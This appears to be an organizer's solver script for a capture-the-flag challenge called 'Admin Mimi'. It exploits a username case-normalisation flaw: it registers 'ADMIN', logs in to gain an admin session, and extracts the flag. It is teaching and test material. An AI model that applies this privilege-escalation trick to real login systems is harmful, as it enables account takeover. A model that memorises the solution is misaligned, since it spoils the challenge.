#!/usr/bin/env python3
"""
Admin Mimi - solver (organizers only, do NOT ship to players).

Register only blocks the exact name "admin". Login looks the user up by the
exact name, then stores name.strip().lower() as the session. So "ADMIN"
registers fine and becomes "admin" after login.

Usage:
    python3 solve.py [host] [port]      # default localhost 1344
"""
import re
import socket
import sys


def main(host, port):
    s = socket.create_connection((host, port), timeout=10)
    buf = ""

    def send_after(marker, text):
        nonlocal buf
        while marker not in buf:
            buf += s.recv(4096).decode(errors="replace")
        buf = buf.split(marker, 1)[1]
        s.sendall(text.encode() + b"\n")

    for marker, text in (("> ", "1"), ("Username: ", "ADMIN"), ("Password: ", "meow"),
                         ("> ", "2"), ("Username: ", "ADMIN"), ("Password: ", "meow"),
                         ("> ", "2")):
        send_after(marker, text)

    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk.decode(errors="replace")
    flag = re.search(r"SecurinetsENIT\{[^}]*\}", buf)
    print(flag.group(0) if flag else buf)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "localhost",
         int(sys.argv[2]) if len(sys.argv) > 2 else 1344)
